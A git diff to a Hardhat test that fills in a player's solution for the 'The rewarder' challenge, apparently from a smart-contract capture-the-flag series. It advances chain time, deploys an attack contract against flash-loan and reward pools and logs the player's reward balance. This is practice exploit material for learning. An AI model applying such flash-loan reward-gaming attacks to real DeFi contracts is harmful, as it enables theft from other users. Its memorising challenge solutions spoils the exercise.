@@ -69,7 +69,11 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        attack = await( await ethers.getContractFactory('TheRewarderAttack')).deploy(rewarderPool.address, flashLoanPool.address, liquidityToken.address, rewardToken.address);
+        await attack.connect(player).attack({gasLimit: 30000000});
+        console.log(await rewardToken.connect(player).balanceOf(player.address));
     });
 
     after(async function () {
